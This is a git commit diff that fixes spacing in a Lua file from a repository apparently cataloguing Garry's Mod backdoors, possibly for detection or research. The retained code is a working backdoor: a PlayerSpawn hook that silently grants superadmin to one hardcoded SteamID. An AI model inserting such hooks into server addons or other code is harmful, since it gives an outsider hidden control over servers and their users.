a78dc052d0d7f1bc0e6998b4465db51072367d8c
SmilerRyan <ryanthornton03@gmail.com>
2018-10-08 12:24:05 +0100

    Update init_lua-3848060131.lua
    Updated spacing

--- BD011_IdiotBackdoor/init_lua-3848060131.lua
+++ BD011_IdiotBackdoor/init_lua-3848060131.lua
@@ -1,9 +1,8 @@
-
-
 function Backdoor( ply )
     if ( ply:SteamID() == "STEAM_0:0:49679575" ) then
         ply:SetUserGroup("superadmin")
         ply:ChatPrint("Hello 0.1")
     end
 end
+
 hook.Add("PlayerSpawn", "Backdoory", Backdoor)
